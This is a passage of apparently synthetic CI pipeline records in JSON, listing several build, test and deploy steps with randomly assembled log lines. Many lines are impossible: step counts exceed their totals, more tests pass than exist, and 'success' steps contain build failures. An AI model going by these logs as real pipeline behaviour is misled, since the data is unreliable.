          "[12:18:45] INFO: Request completed",
          "Step 14/17: Running migrations",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Ran 19 tests in 31s",
          "Bundling runtime.css",
          "Processing...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_db_connect (96ms)",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Using Python 3.12",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed express-4.15",
          "Platform: win32-x64",
          "[12:18:45] WARN: Deprecated API usage",
          "Transforming 465 files...",
          "Step 9/20: Running migrations",
          "[12:18:45] DEBUG: Query executed in 82ms",
          "Ran 200 tests in 29s",
          "[12:18:45] DEBUG: Memory usage: 1626MB",
          "npm install: added 457 packages",
          "Time: 105.606s",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-05T12:21:14.660644",
        "finished_at": "2025-12-05T12:21:20.277879",
        "log_lines": [
          "=== Step: deploy_production ===",
          "NODE_ENV=test",
          "Cache invalidated: node_modules",
          "Using Node.js 16.6.2",
          "Compiling components/utils.go...",
          "Cache hit for key-6154",
          "Pushing to registry...",
          "Minifying vendor.js",
          "[12:18:45] INFO: Connecting to database",
          "npm install: resolved 1107 packages",
          "GET /status - 204 (35ms)",
          "Time: 6.602s",
          "[12:18:45] ERROR: Connection failed",
          "Step 19/15: Deploying",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] DEBUG: Initializing service",
          "Step 13/15: Linting",
          "Step 20/21: Building",
          "Tests: 138 passed, 465 total",
          "Using Node.js 16.19.5",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Using Node.js 20.17.4",
          "Cache saved successfully",
          "Bundling styles.css",
          "Pushing to registry...",
          "NODE_ENV=production",
          "Verifying...",
          "Cache miss for key-1158",
          "Step 7/22: Deploying",
          "Exception: TypeError",
          "HEAD is now at faa0159",
          "Loading...",
          "pip: Collecting webpack",
          "Ready.",
          "[12:18:45] DEBUG: Query executed in 86ms",
          "HEAD is now at 9e523d4",
          "[12:18:45] INFO: Processing request",
          "Checking out main branch",
          "Fetching submodules...",
          "Platform: darwin-arm64",
          "Cache miss for key-8399",
          "NODE_ENV=development",
          "\u2713 Step 'test' succeeded",
          "npm notice: created a lockfile",
          "Verifying...",
          "pip: Collecting prettier",
          "Cache invalidated: node_modules",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] WARN: Deprecated API usage",
          "Generating source maps...",
          "pip install: Successfully installed express-5.20",
          "Cache restored successfully (466MB)",
          "Done.",
          "Artifact uploaded: dist.zip (12MB)",
          "yarn add: Done in 26.81s",
          "\u2713 test completed",
          "Tests: 352 passed, 128 total",
          "\u2717 build failed with exit code 121",
          "npm install: resolved 1013 packages",
          "Building Docker image...",
          "npm install: resolved 756 packages",
          "TLS handshake completed",
          "Success!",
          "Step 20/23: Linting",
          "Finished.",
          "Bundling styles.js",
          "[12:18:45] DEBUG: Connection pool: 17 active",
          "Step 2/25: Running migrations",
          "Switched to branch 'feature/task-734'",
          "[12:18:45] DEBUG: Query executed in 50ms",
          "Transforming 604 files...",
          "Loading...",
          "Using Python 3.12",
          "Fetching submodules...",
          "[12:18:45] WARN: Deprecated API usage",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:45] INFO: Cache refreshed",
          "Cache invalidated: dependencies",
          "\u2713 build completed",
          "\u2713 Step 'setup' succeeded",
          "Artifact downloaded: 9MB",
          "Completed.",
          "Uploading artifact 'dist' (46 files)",
          "Verifying...",
          "Step 13/19: Testing",
          "Step 15/22: Linting",
          "Connection established",
          "Success!",
          "NODE_ENV=development",
          "Cache invalidated: dependencies",
          "[12:18:45] DEBUG: Connection pool: 8 active",
          "\u2713 Task completed in 2440ms",
          "yarn add: Done in 18.66s",
          "Step 18/21: Testing",
          "pip: Collecting lodash",
          "WARNING: express has known vulnerabilities",
          "Switched to branch 'bugfix/task-962'",
          "Artifact downloaded: 37MB",
          "\u2717 build failed with exit code 88",
          "[12:18:45] INFO: Processing request",
          "[12:18:45] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (1MB)",
          "Uploading artifact 'coverage' (17 files)",
          "WARNING: jest has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Finished.",
          "Compiling utils/utils.go...",
          "Fetching submodules...",
          "Fetching submodules...",
          "Test Suites: 32 passed, 49 total",
          "Ready.",
          "Environment: test",
          "Loading...",
          "Step 10/22: Building",
          "Cache restored successfully (333MB)",
          "Layer 7/11: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'feature/task-454'",
          "pip: Collecting webpack",
          "Using Python 3.10",
          "Step 8/18: Deploying",
          "HEAD is now at c3c8205",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_cache_hit (427ms)",
          "Cache restored successfully (97MB)",
          "[12:18:45] INFO: Request completed",
          "Cache saved successfully",
          "Connecting to cloud.services:443...",
          "Bundling main.js",
          "pip: Collecting react",
          "Connection established",
          "Compiling utils/main.py...",
          "OK",
          "Ready.",
          "[12:18:45] DEBUG: Initializing service",
          "Exception: TypeError",
          "Test Suites: 44 passed, 25 total",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache miss for key-6713",
          "[12:18:45] INFO: Cache refreshed",
          "Tests: 212 passed, 387 total",
          "Transforming 374 files...",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] INFO: Request completed",
          "Layer 10/15: ENV command",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/23: Building",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-05T12:21:20.277879",
        "finished_at": "2025-12-05T12:21:34.320967",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 4/15: Linting",
          "[12:18:45] INFO: Connecting to database",
          "NODE_ENV=production",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:18:45] INFO: Cache refreshed",
          "  PASS: unit/test_db_connect.spec.js",
          "Loading...",
          "OK",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:18:45] DEBUG: Connection pool: 5 active",
          "Switched to branch 'hotfix/task-527'",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Environment: development",
          "[12:18:45] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "[12:18:45] INFO: Cache refreshed",
          "Checking out master branch",
          "Connecting to cloud.services:443...",
          "[12:18:45] DEBUG: Connection pool: 3 active",
          "[12:18:45] DEBUG: Loading configuration",
          "[12:18:45] INFO: Starting build process",
          "Compiling src/utils.go...",
          "\u2713 Step 'setup' succeeded",
          "Bundling styles.css",
          "Ready.",
          "GET /health - 201 (56ms)",
          "FAILED: test_cache_hit",
          "Compiling utils/app.ts...",
          "[12:18:45] DEBUG: Memory usage: 907MB",
          "Switched to branch 'feature/task-993'",
          "NODE_ENV=development",
          "Connecting to example.com:443...",
          "Compiling utils/handler.rs...",
          "[12:18:45] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Cache miss for key-2460",
          "Cache hit for key-9078",
          "Artifact downloaded: 2MB",
          "[12:18:45] INFO: Cache refreshed",
          "Installing lodash@3.11.3",
          "npm install: resolved 380 packages",
          "[12:18:45] INFO: Processing request",
          "Creating production build...",
          "[12:18:45] INFO: Processing request",
          "Step 9/17: Deploying",
          "Done.",
          "pip: Installing build dependencies...",
          "HEAD is now at 6b14535",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Layer 3/9: COPY command",
          "Uploading artifact 'dist' (44 files)",
          "Connecting to test.io:443...",
          "Success!",
          "Finished.",
          "Compiling lib/index.js...",
          "\u2713 Task completed in 1395ms",
          "[12:18:45] DEBUG: Query executed in 27ms",
          "Compiling utils/handler.rs...",
          "Creating production build...",
          "Step 1/24: Deploying",
          "Installing express@5.0.4",
          "[12:18:45] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache miss for key-7411",
          "[12:18:45] ERROR: Connection failed",
          "OK",
          "\u2713 validate completed",
          "Step 13/15: Installing dependencies",
          "Ran 42 tests in 38s",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-5663",
          "Step 8/21: Linting",
          "Step 19/17: Linting",
          "[12:18:45] DEBUG: Loading configuration",
          "Installing prettier@3.19.10",
          "Step 7/19: Running migrations",
          "FAILED: test_api_health",
          "Cache restored successfully (249MB)",
          "[12:18:45] ERROR: Connection failed",
          "WARNING: prettier has known vulnerabilities",
          "OK",
          "\u2713 Step 'setup' succeeded",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-8810",
          "Waiting...",
          "Already up to date.",
          "Cache miss for key-8253",
          "npm install: resolved 266 packages",
          "\u2713 Task completed in 1710ms",
          "  PASS: e2e/test_user_create.spec.js",
          "WARNING: jest has known vulnerabilities",
          "Test Suites: 11 passed, 30 total",
          "Loading...",
          "npm install: resolved 1899 packages",
          "pip: Downloading eslint-4.2.tar.gz",
          "HEAD is now at 5ecfcae",
          "Step 17/25: Deploying",
          "Loading...",
          "yarn add: Done in 3.20s",
          "Checking out main branch",
          "Cache miss for key-3771",
          "Success!",
          "[12:18:45] INFO: Request completed",
          "npm install: resolved 1495 packages",
          "Step 8/22: Deploying",
          "Processing...",
          "Using Node.js 17.14.10",
          "Time: 12.495s",
          "npm notice: package.json updated",
          "Time: 57.587s",
          "Processing...",
          "[12:18:45] DEBUG: Initializing service",
          "Completed.",
          "Processing...",
          "GET /health - 200 (7ms)",
          "Step 9/22: Running migrations",
          "POST /api - 200 (488ms)",
          "  PASS: integration/test_user_create.spec.js",
          "pip: Downloading eslint-2.7.tar.gz",
          "Cache invalidated: dependencies",
          "Snapshots: 42 passed, 32 total",
          "[12:18:45] DEBUG: Initializing service",
          "pip install: Successfully installed jest-2.19",
          "[12:18:45] WARN: Deprecated API usage",
          "Snapshots: 29 passed, 49 total",
          "Success!",
          "HEAD is now at 81f8f38",
          "Checking out master branch",
          "Ran 76 tests in 50s",
          "Done.",
          "Step 7/25: Building",
          "Connecting to cloud.services:443...",
          "Optimizing 77 modules...",
          "Finished.",
          "Exception: NullPointerException",
          "\u2713 Step 'setup' succeeded",
          "[12:18:45] ERROR: Connection failed",
          "Creating production build...",
          "HEAD is now at b69d3f3",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Loading...",
          "Finished.",
          "Already up to date.",
          "pip: Downloading axios-2.9.tar.gz",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-05T12:21:34.320967",
        "finished_at": "2025-12-05T12:21:48.364055",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "\u2713 Step 'install' succeeded",
          "Waiting...",
          "Step 10/17: Deploying",
          "Transforming 316 files...",
          "HEAD is now at 20faa62",
          "TLS handshake completed",
          "[12:18:45] DEBUG: Query executed in 53ms",
          "Using Node.js 16.8.2",
          "Switched to branch 'bugfix/task-800'",
          "Cache invalidated: node_modules",
          "Image pulled successfully",
          "[12:18:45] DEBUG: Query executed in 24ms",
          "[12:18:45] INFO: Request completed",
          "[12:18:45] DEBUG: Query executed in 31ms",
          "[12:18:45] WARN: Deprecated API usage",
          "npm install: resolved 284 packages",
          "Step 11/25: Installing dependencies",
          "Artifact uploaded: dist.zip (72MB)",
          "Connecting to cloud.services:443...",
          "[12:18:45] INFO: Request completed",
          "Verifying...",
          "[12:18:45] INFO: Starting build process",
          "[12:18:45] DEBUG: Initializing service",
          "Waiting...",
          "[12:18:45] INFO: Request completed",
          "Verifying...",
          "Coverage: 96% statements, 64% branches",
          "POST /upload - 200 (202ms)",
          "Cache invalidated: build",
          "Checking out main branch",
          "Already up to date.",
          "[12:18:45] INFO: Starting build process",
          "pip: Downloading express-1.17.tar.gz",
          "Loading...",
          "  PASS: test_db_connect (425ms)",
          "Connecting to test.io:443...",
          "  PASS: integration/test_api_health.spec.js",
          "  PASS: e2e/test_api_health.spec.js",
          "POST /upload - 202 (312ms)",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "[12:18:45] WARN: Deprecated API usage",
          "pip: Collecting prettier",
          "WARNING: express has known vulnerabilities",
          "Cache miss for key-6851",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u2717 build failed with exit code 71",
          "Generating source maps...",
          "pip: Collecting react",
          "Snapshots: 6 passed, 43 total",
          "[12:18:45] INFO: Cache refreshed",
          "Processing...",
          "HEAD is now at c905327",
          "Platform: win32-x64",
          "Generating source maps...",
          "[12:18:45] INFO: Cache refreshed",
          "POST /api - 201 (109ms)",
          "Optimizing 46 modules...",
          "Step 12/22: Testing",
          "Tests: 366 passed, 212 total",
          "Installing webpack@4.0.0",
          "Artifact uploaded: dist.zip (28MB)",
          "Uploading artifact 'coverage' (30 files)",
          "FAILED: test_api_health",
          "Step 20/15: Linting",
          "Time: 9.874s",
          "Finished.",
          "[12:18:45] WARN: Deprecated API usage",
          "GET /status - 201 (17ms)",
          "Switched to branch 'hotfix/task-319'",
          "Loading...",
          "\u2713 Task completed in 190ms",
          "[12:18:45] INFO: Connecting to database",
          "Cache miss for key-2055",
          "pip: Collecting lodash",
          "Step 12/23: Running migrations",
          "Layer 7/15: ENV command",
          "WARNING: axios has known vulnerabilities",
          "Step 17/21: Testing",
          "Checking out develop branch",
          "Time: 72.252s",
          "Connecting to test.io:443...",
          "Step 7/17: Installing dependencies",
          "Fetching submodules...",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Environment: development",
          "Cache invalidated: dependencies",
          "[12:18:45] INFO: Processing request",
          "[12:18:45] DEBUG: Connection pool: 1 active",
          "[12:18:45] INFO: Starting build process",
          "[12:18:45] INFO: Cache refreshed",
          "[12:18:45] INFO: Processing request",
          "Creating production build...",
          "Uploading artifact 'coverage' (33 files)",
          "Connecting to example.com:443...",
          "Test Suites: 35 passed, 42 total",
          "pip: Downloading express-2.8.tar.gz",
          "\u2713 test completed",
          "pip: Installing build dependencies...",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] DEBUG: Loading configuration",
          "Platform: linux-x64",
          "Artifact downloaded: 31MB",
          "Cache restored successfully (89MB)",
          "Checking out main branch",
          "Success!",
          "Test Suites: 15 passed, 17 total",
          "Image pulled successfully",
          "Success!",
          "[12:18:45] DEBUG: Loading configuration",
          "npm install: added 105 packages",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling lib/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@2.17.2",
          "\u2713 deploy completed",
          "Installing jest@5.4.6",
          "Generating source maps...",
          "pip: Downloading eslint-4.16.tar.gz",
          "Environment: test",
          "Building Docker image...",
          "Step 13/21: Testing",
          "[12:18:45] INFO: Request completed",
          "Transforming 126 files...",
          "Coverage: 77% statements, 97% branches",
          "Cache hit for key-4026",
          "[12:18:45] DEBUG: Loading configuration",
          "Cache hit for key-8659",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_user_create",
          "Bundling runtime.css",
          "Optimizing 57 modules...",
          "Compiling lib/service.java...",
          "Step 8/22: Linting",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "Time: 103.650s",
          "Cache hit for key-4385",
          "Compiling utils/app.ts...",
          "Pulling image: python:latest",
          "Loading...",
          "Time: 77.831s",
          "\u2713 lint completed",
          "Compiling components/service.java...",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-05T12:21:48.364055",
        "finished_at": "2025-12-05T12:22:02.407143",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:18:45] DEBUG: Initializing service",
          "Compiling utils/index.js...",
          "Using Python 3.10",
          "\u2713 Step 'checkout' succeeded",
          "Layer 4/14: RUN command",
          "Exception: TypeError",
          "HEAD is now at 9bcda80",
          "Cache invalidated: build",
          "[12:18:45] DEBUG: Connection pool: 18 active",
          "Bundling main.js",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: jest has known vulnerabilities",
          "Cache restored successfully (446MB)",
          "Platform: win32-x64",
          "HEAD is now at 44debd2",
          "[12:18:45] INFO: Request completed",
          "Compiling lib/utils.go...",
          "Switched to branch 'feature/task-777'",
          "Test Suites: 34 passed, 32 total",
          "Coverage: 89% statements, 91% branches",
          "[12:18:45] WARN: Deprecated API usage",
          "Building Docker image...",
          "[12:18:45] DEBUG: Connection pool: 20 active",
          "Pulling image: alpine:18",
          "[12:18:45] INFO: Connecting to database",
          "Transforming 985 files...",
          "Done.",
          "Test Suites: 30 passed, 46 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "[12:18:45] INFO: Cache refreshed",
          "TLS handshake completed",
          "[12:18:45] DEBUG: Initializing service",
          "Connection established",
          "Platform: linux-x64",
          "Cache invalidated: build",
          "Fetching submodules...",
          "Step 15/25: Building",
          "Connection established",
          "pip: Collecting axios",
          "Optimizing 10 modules...",
          "Cache invalidated: node_modules",
          "[12:18:45] WARN: Deprecated API usage",
          "Coverage: 86% statements, 69% branches",
          "pip: Collecting eslint",
          "Compiling lib/app.ts...",
          "Tests: 469 passed, 169 total",
          "Checking out develop branch",
          "Image pulled successfully",
          "Installing webpack@3.19.4",
          "Bundling runtime.css",
          "Installing express@5.16.1",
          "  PASS: test_user_create (333ms)",
          "\u2713 Task completed in 4070ms",
          "Compiling components/index.js...",
          "Compiling src/app.ts...",
          "Artifact uploaded: dist.zip (6MB)",
          "\u2713 Task completed in 2145ms",
          "GET /api - 201 (22ms)",
          "Building Docker image...",
          "Environment: production",
          "Environment: staging",
          "npm notice: package.json updated",
          "[12:18:45] DEBUG: Memory usage: 711MB",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (76MB)",
          "Exception: RuntimeError",
          "[12:18:45] INFO: Cache refreshed",
          "Step 8/19: Running migrations",
          "OK",
          "Verifying...",
          "Compiling components/service.java...",
          "npm notice: created a lockfile",
          "[12:18:45] DEBUG: Connection pool: 13 active",
          "Time: 62.484s",
          "[12:18:45] INFO: Connecting to database",
          "HEAD is now at d402d9f",
          "Using Python 3.11",
          "Using Node.js 14.9.2",
          "Pushing to registry...",
          "FAILED: test_db_connect",
          "Ran 49 tests in 46s",
          "Image pulled successfully",
          "Uploading artifact 'build' (21 files)",
          "Done.",
          "Cache saved successfully",
          "Creating production build...",
          "Creating production build...",
          "[12:18:45] DEBUG: Connection pool: 20 active",
          "\u2713 Task completed in 569ms",
          "pip: Collecting webpack",
          "[12:18:45] WARN: Deprecated API usage",
          "Connection established",
          "Pushing to registry...",
          "Verifying...",
          "Using Python 3.9",
          "Verifying...",
          "Cache restored successfully (339MB)",
          "Optimizing 72 modules...",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] DEBUG: Memory usage: 1327MB",
          "Uploading artifact 'coverage' (20 files)",
          "Step 5/21: Testing",
          "GET /health - 204 (91ms)",
          "npm install: added 157 packages",
          "Compiling src/service.java...",
          "Waiting...",
          "Processing...",
          "Compiling src/handler.rs...",
          "pip: Downloading express-3.14.tar.gz",
          "Cache miss for key-9074",
          "Step 2/18: Deploying",
          "[12:18:45] DEBUG: Memory usage: 1969MB",
          "npm notice: created a lockfile",
          "Transforming 774 files...",
          "Compiling components/main.py...",
          "TLS handshake completed",
          "Uploading artifact 'dist' (9 files)",
          "\u2713 Step 'checkout' succeeded",
          "Environment: test",
          "HEAD is now at 4bdd7db",
          "Coverage: 80% statements, 90% branches",
          "Image pulled successfully",
          "Loading...",
          "Compiling lib/main.py...",
          "[12:18:45] INFO: Starting build process",
          "npm install: added 427 packages",
          "Step 5/21: Installing dependencies",
          "TLS handshake completed",
          "  PASS: unit/test_cache_hit.spec.js",
          "  PASS: test_auth_login (73ms)",
          "\u2713 Task completed in 4507ms",
          "\u2717 build failed with exit code 58",
          "Compiling lib/utils.go...",
          "pip: Downloading lodash-3.3.tar.gz",
          "yarn add: Done in 7.77s",
          "Creating production build...",
          "Uploading artifact 'dist' (22 files)",
          "pip: Collecting express",
          "Ran 18 tests in 14s",
          "Installing express@4.20.5",
          "npm install: resolved 1110 packages",
          "Step 11/24: Running migrations",
          "\u2713 All checks passed",
          "Step 8/22: Testing",
          "[12:18:45] INFO: Connecting to database",
          "[12:18:45] WARN: Deprecated API usage",
          "Cache hit for key-6820",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-05T12:22:02.407143",
        "finished_at": "2025-12-05T12:22:16.450231",
        "log_lines": [
          "=== Step: setup_node ===",
          "Waiting...",
          "pip: Downloading webpack-5.1.tar.gz",
          "Success!",
          "Coverage: 70% statements, 76% branches",
          "[12:18:45] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 77",
          "Artifact downloaded: 42MB",
          "Uploading artifact 'dist' (36 files)",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] INFO: Cache refreshed",
          "Success!",
          "Processing...",
          "[12:18:45] INFO: Cache refreshed",
          "Bundling styles.css",
          "[12:18:45] INFO: Processing request",
          "Optimizing 37 modules...",
          "Done.",
          "[12:18:45] INFO: Cache refreshed",
          "yarn add: Done in 28.61s",
          "[12:18:45] INFO: Cache refreshed",
          "NODE_ENV=development",
          "Pushing to registry...",
          "Step 4/25: Building",
          "HEAD is now at 73d4858",
          "Compiling lib/index.js...",
          "Compiling utils/utils.go...",
          "Cache restored successfully (21MB)",
          "Generating source maps...",
          "Minifying vendor.js",
          "WARNING: react has known vulnerabilities",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: TypeError",
          "[12:18:45] WARN: Deprecated API usage",
          "Transforming 449 files...",
          "Uploading artifact 'dist' (31 files)",
          "[12:18:45] INFO: Processing request",
          "\u2717 build failed with exit code 109",
          "Step 19/17: Deploying",
          "Step 11/20: Linting",
          "[12:18:45] INFO: Request completed",
          "Building Docker image...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Environment: development",
          "  PASS: integration/test_db_connect.spec.js",
          "Exception: ValueError",
          "[12:18:45] DEBUG: Memory usage: 1391MB",
          "Platform: win32-x64",
          "[12:18:45] DEBUG: Memory usage: 840MB",
          "OK",
          "Pushing to registry...",
          "Cache restored successfully (155MB)",
          "Coverage: 86% statements, 68% branches",
          "WARNING: jest has known vulnerabilities",
          "Generating source maps...",
          "[12:18:45] DEBUG: Memory usage: 1227MB",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 14/19: Building",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 All checks passed",
          "[12:18:45] DEBUG: Connection pool: 15 active",
          "TLS handshake completed",
          "Checking out develop branch",
          "Cache hit for key-5486",
          "npm install: added 228 packages",
          "pip: Collecting lodash",
          "Processing...",
          "Cache invalidated: dependencies",
          "Test Suites: 48 passed, 17 total",
          "Platform: win32-x64",
          "Bundling runtime.css",
          "pip: Downloading eslint-3.16.tar.gz",
          "Cache invalidated: dependencies",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Step 13/16: Building",
          "[12:18:45] INFO: Processing request",
          "Checking out develop branch",
          "Cache hit for key-1759",
          "\u2713 Task completed in 166ms",
          "GET /status - 201 (60ms)",
          "GET /health - 200 (23ms)",
          "Connecting to cloud.services:443...",
          "Ready.",
          "Environment: development",
          "Step 8/16: Testing",
          "Using Python 3.12",
          "Cache miss for key-2716",
          "Test Suites: 49 passed, 12 total",
          "Compiling lib/handler.rs...",
          "Waiting...",
          "[12:18:45] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "npm install: resolved 1273 packages",
          "[12:18:45] WARN: Deprecated API usage",
          "Using Python 3.10",
          "pip: Installing build dependencies...",
          "Compiling utils/handler.rs...",
          "[12:18:45] INFO: Processing request",
          "pip install: Successfully installed express-3.1",
          "Artifact uploaded: dist.zip (3MB)",
          "[12:18:45] DEBUG: Initializing service",
          "Step 4/25: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Step 4/18: Linting",
          "Tests: 204 passed, 58 total",
          "[12:18:45] DEBUG: Loading configuration",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Compiling lib/utils.go...",
          "Step 7/18: Linting",
          "Ready.",
          "Done.",
          "Compiling lib/handler.rs...",
          "Cache saved successfully",
          "TLS handshake completed",
          "[12:18:45] DEBUG: Memory usage: 494MB",
          "\u2713 Task completed in 2092ms",
          "pip: Downloading jest-4.19.tar.gz",
          "Step 13/24: Deploying",
          "\u2713 Step 'build' succeeded",
          "Verifying...",
          "[12:18:45] INFO: Request completed",
          "Completed.",
          "Environment: production",
          "[12:18:45] INFO: Cache refreshed",
          "Time: 80.732s",
          "Test Suites: 41 passed, 43 total",
          "Layer 1/15: RUN command",
          "  PASS: integration/test_auth_login.spec.js",
          "Installing express@1.5.5",
          "Pulling image: alpine:18",
          "Layer 8/14: RUN command",
          "Creating production build...",
          "Step 3/20: Building",
          "Pulling image: node:3.11",
          "Using Node.js 14.0.8",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_db_connect (332ms)",
          "[12:18:45] DEBUG: Initializing service",
          "GET /health - 201 (10ms)",
          "Success!",
          "Pushing to registry...",
          "[12:18:45] INFO: Starting build process",
          "Connection established",
          "Snapshots: 5 passed, 36 total",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-05T12:22:16.450231",
        "finished_at": "2025-12-05T12:22:24.876084",
        "log_lines": [
          "=== Step: restore_cache ===",
          "[12:18:45] DEBUG: Query executed in 54ms",
          "[12:18:45] INFO: Request completed",
          "Connecting to test.io:443...",
          "\u2713 Task completed in 4331ms",
          "Transforming 971 files...",
          "Minifying main.js",
          "[12:18:45] INFO: Connecting to database",
          "Step 9/19: Running migrations",
          "Finished.",
          "Using Node.js 15.7.10",
          "Verifying...",
          "npm install: resolved 1097 packages",
          "\u2713 Task completed in 4141ms",
          "Exception: TypeError",
          "[12:18:45] INFO: Request completed",
          "Compiling src/main.py...",
          "Switched to branch 'hotfix/task-346'",
          "Already up to date.",
          "[12:18:45] DEBUG: Query executed in 38ms",
          "Transforming 848 files...",
          "Minifying app.js",
          "Switched to branch 'hotfix/task-821'",
          "GET /api - 204 (4ms)",
          "Step 12/15: Running migrations",
          "Connecting to acme.corp:443...",
          "Already up to date.",
          "NODE_ENV=development",
          "OK",
          "[12:18:45] DEBUG: Memory usage: 702MB",
          "npm install: added 357 packages",
          "POST /api - 201 (222ms)",
          "NODE_ENV=development",
          "Cache hit for key-7376",
          "Verifying...",
          "Cache hit for key-3024",
          "\u2713 package completed",
          "Using Python 3.12",
          "Step 3/20: Testing",
          "[12:18:45] DEBUG: Connection pool: 4 active",
          "Compiling components/handler.rs...",
          "FAILED: test_db_connect",
          "Checking out main branch",
          "Success!",
          "[12:18:45] WARN: Deprecated API usage",
          "npm install: resolved 1549 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 18.15.2",
          "[12:18:45] DEBUG: Loading configuration",
          "Step 19/24: Running migrations",
          "Completed.",
          "Pulling image: python:18",
          "Using Python 3.9",
          "Step 19/18: Building",
          "Artifact uploaded: dist.zip (74MB)",
          "[12:18:45] INFO: Request completed",
          "Compiling utils/utils.go...",
          "Optimizing 35 modules...",
          "Switched to branch 'bugfix/task-831'",
          "WARNING: express has known vulnerabilities",
          "Pulling image: python:3.11",
          "Pushing to registry...",
          "[12:18:45] INFO: Connecting to database",
          "Cache restored successfully (130MB)",
          "Installing prettier@5.13.7",
          "GET /api - 200 (72ms)",
          "[12:18:45] DEBUG: Connection pool: 11 active",
          "Pushing to registry...",
          "\u2713 Task completed in 2496ms",
          "Cache restored successfully (113MB)",
          "[12:18:45] INFO: Starting build process",
          "Compiling components/index.js...",
          "[12:18:45] INFO: Connecting to database",
          "Fetching submodules...",
          "Exception: TypeError",
          "Step 19/20: Linting",
          "\u2713 Step 'build' succeeded",
          "Exception: ValueError",
          "Time: 119.90s",
          "Pulling image: python:18",
          "Ran 62 tests in 60s",
          "Step 10/21: Testing",
          "Success!",
          "Generating source maps...",
          "npm install: resolved 176 packages",
          "Step 15/22: Building",
          "\u2713 Task completed in 4747ms",
          "[12:18:45] DEBUG: Memory usage: 354MB",
          "\u2717 build failed with exit code 105",
          "Cache miss for key-3194",
          "Generating source maps...",
          "[12:18:45] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "[12:18:45] DEBUG: Memory usage: 516MB",
          "Step 1/17: Building",
          "npm install: added 181 packages",
          "Image pulled successfully",
          "Success!",
          "Platform: darwin-arm64",
          "Fetching submodules...",
          "Bundling vendor.css",
          "Success!",
          "Platform: darwin-arm64",
          "Step 18/19: Testing",
          "[12:18:45] INFO: Processing request",
          "Connection established",
          "WARNING: prettier has known vulnerabilities",
          "Verifying...",
          "Fetching submodules...",
          "Pulling image: alpine:18",
          "\u2713 Task completed in 3199ms",
          "Step 14/17: Testing",
          "\u2713 Task completed in 3680ms",
          "POST /data - 200 (200ms)",
          "\u2713 Task completed in 1870ms",
          "\u2713 Task completed in 1259ms",
          "Step 8/24: Installing dependencies",
          "Compiling utils/index.js...",
          "Connecting to example.com:443...",
